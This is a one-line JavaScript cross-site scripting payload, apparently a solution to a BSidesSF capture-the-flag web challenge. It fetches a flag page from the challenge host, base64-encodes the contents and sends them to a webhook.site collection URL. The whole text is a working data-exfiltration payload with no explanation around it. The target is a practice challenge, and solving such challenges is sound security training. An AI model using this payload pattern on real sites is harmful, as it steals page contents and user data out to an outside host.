fetch('https://web-tutorial-3-74cd9c56.challenges.bsidessf.net/xss-three-flag').then(res=>res.text()).then(data=>fetch('https://webhook.site/be3e280b-cb6d-4dff-a420-03cd27c0ffb7/?body='+btoa(data)))
